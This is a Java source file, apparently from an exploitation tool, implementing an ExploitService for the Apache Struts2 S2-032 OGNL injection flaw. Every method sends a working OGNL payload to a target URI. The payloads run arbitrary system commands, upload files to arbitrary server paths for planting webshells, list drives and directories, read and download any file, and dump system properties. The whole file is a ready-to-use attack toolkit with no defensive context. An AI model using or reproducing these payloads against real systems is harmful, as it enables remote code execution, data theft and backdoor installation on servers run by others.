package org.vti.service.impl;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.vti.service.ExploitService;
import org.vti.util.RequestUtil;

public class Struts2_S032_ExploitServiceImpl implements ExploitService{
	
	@Override
	public String getRealPath(String uri) throws Exception{
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#path=#req.getSession().getServletContext().getRealPath(#parameters.arg[0]),"+
				"#resp.getWriter().println(#path),"+
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");
		
		String requestURL = uri+ "?method:" + commandURL + "&arg=/";
		
		StringBuffer buf=new StringBuffer("\u7269\u7406\u5730\u5740\uff1a");
		
		buf.append(RequestUtil.getInstance().doRequest(requestURL));
		
		return buf.toString();
	}
	
	@Override
	public Map<String, String> getServerInfo(String uri,Map<String, String>properties) throws Exception {
		
		Map<String, String>echo=new LinkedHashMap<String,String>();
		
		for (Entry<String, String> entry:properties.entrySet()) {
			
			String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
					"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
					"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
					"#pro=@java.lang.System@getProperty(#parameters.arg[0])," +
					"#resp.getWriter().println(#pro),"+
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close(),#req.toString","UTF-8");
			
			String requestURL = uri+ "?method:" + commandURL + "&arg="+entry.getValue()+"";
			
			echo.put(entry.getKey(),RequestUtil.getInstance().doRequest(requestURL));
		}
		return echo;
	}

	@Override
	public String doExecuteCMD(String uri, String cmd) throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#a=@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),"+
				"#s=new java.util.Scanner(#a.getInputStream()).useDelimiter(#parameters.x[0])," +
				"#msg=(#s.hasNext() ? #s.next() : #parameters.y[0]),"+
				"#resp.getWriter().println(#msg)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");
		
		
		String requestURL = uri+ "?method:" + commandURL + "&cmd="+URLEncoder.encode(cmd,"UTF-8")+"&x=\\\\A&y=";
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(RequestUtil.getInstance().getInputStream(requestURL)));
		
		String str="";
		while (reader.ready()) {
			str+=reader.readLine()+"\r\n";
		}
		
		return str;
	}

	@Override
	public boolean doUpload(String uri, String fileName, String content)
			throws Exception {
		
		fileName="/"+fileName;
		content=content.replace("\"","\\\"");
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#path=#req.getRealPath(#parameters.arg[0])," +
				"#file=new java.io.File(#path+parameters.fileName[0])," +
				"#content=new java.lang.String(#parameters.content[0])," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close()," +
				"#resp.getWriter().println(200)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");
		
		String requestURL = uri+ "?method:" + commandURL + "&arg=/&name="+URLEncoder.encode(fileName,"UTF-8")+"&content="+URLEncoder.encode(content,"UTF-8");
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		if (message.equals("200")) {
			return true;
		}else {
			return false;
		}
	}
	

	@Override
	public boolean doCustomUplaod(String uri, String filePath, String content)
			throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#file=new java.io.File(#parameters.path[0])," +
				"#content=new java.lang.String(#parameters.content[0])," +
				"#fos=new java.io.FileOutputStream(#file)," +
				"#fos.write(#content.getBytes())," +
				"#fos.flush()," +
				"#fos.close()," +
				"#resp.getWriter().println(200)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");
		
		String requestURL = uri+ "?method:" + commandURL + "&arg=200&path="+URLEncoder.encode(filePath.trim(),"UTF-8")+"&content="+URLEncoder.encode(content,"UTF-8");
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
	
		if (message.equals("200")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public List<String> doGetFileSystem(String uri) throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#sys=@java.io.File@listRoots()," +
				"#resp.getWriter().println(#sys.length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");
		
		String requestURL = uri+ "?method:" + commandURL;
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
		
		List<String>list=new ArrayList<>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
					"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
					"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
					"#sys=@java.io.File@listRoots()," +
					"#resp.getWriter().println(#sys["+i+"])," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close(),#req.toString","UTF-8");
			
			String diskURL = uri+ "?method:" + diskCmdURL ;
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		return list;
	}

	@Override
	public List<String> doListFiles(String uri, String path)
			throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#file=new java.io.File(#parameters.path[0])," +
				"#resp.getWriter().println(#file.listFiles().length)," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");
		
		String requestURL = uri+ "?method:" + commandURL +"&path="+URLEncoder.encode(path.trim(),"UTF-8")+"";
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
		
		List<String>list=new ArrayList<>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
					"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
					"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
					"#file=new java.io.File(#parameters.path[0])," +
					"#resp.getWriter().println(#file.listFiles()["+i+"].getName())," +
					"#resp.getWriter().flush()," +
					"#resp.getWriter().close(),#req.toString","UTF-8");
			
			String diskURL =uri+ "?method:" + diskCmdURL +"&path="+URLEncoder.encode(path.trim(),"UTF-8")+"";
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		
		return list;
	}

	@Override
	public String doGetFileContent(String uri, String path) throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#file=new java.io.File(#parameters.path[0])," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#lenth=#file.length(),"+
				"#buf=new byte[#lenth]," +
				"#dis.readFully(#buf),"+
				"#dis.close(),"+
				"#resp.getOutputStream().write(#buf)," +
				"#resp.getOutputStream().flush()," +
				"#resp.getOutputStream().close(),#req.toString","UTF-8");

		String requestURL = uri+ "?method:" + commandURL +"&path="+URLEncoder.encode(path.trim(),"UTF-8")+"";
		
		InputStream inputStream=RequestUtil.getInstance().getInputStream(requestURL);
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(inputStream));
		
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str+"\r\n");
		}
		reader.close();
		
		return buf.toString();
	}

	@Override
	public boolean doIsDirectory(String uri, String path) throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#file=new java.io.File(#parameters.path[0])," +
				"#resp.getWriter().println(#file.isDirectory())," +
				"#resp.getWriter().flush()," +
				"#resp.getWriter().close(),#req.toString","UTF-8");

		String requestURL = uri+ "?method:" + commandURL +"&path="+URLEncoder.encode(path.trim(),"UTF-8")+"";
		
		return Boolean.parseBoolean(RequestUtil.getInstance().doRequest(requestURL));
		
	}

	@Override
	public InputStream doDownload(String uri, String rpath)
			throws Exception {
		
		String commandURL =URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," +
				"#req=@org.apache.struts2.ServletActionContext@getRequest()," +
				"#resp=@org.apache.struts2.ServletActionContext@getResponse()," +
				"#file=new java.io.File(#parameters.path[0])," +
				"#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file)),"+
				"#lenth=#file.length(),"+
				"#buf=new byte[#lenth]," +
				"#dis.readFully(#buf),"+
				"#dis.close(),"+
				"#resp.getOutputStream().write(#buf)," +
				"#resp.getOutputStream().flush()," +
				"#resp.getOutputStream().close(),#req.toString","UTF-8");
		
		String requestURL = uri+ "?method:" + commandURL +"&path="+URLEncoder.encode(rpath.trim(),"UTF-8")+"";
		
		return RequestUtil.getInstance().getInputStream(requestURL);
	}

	
}
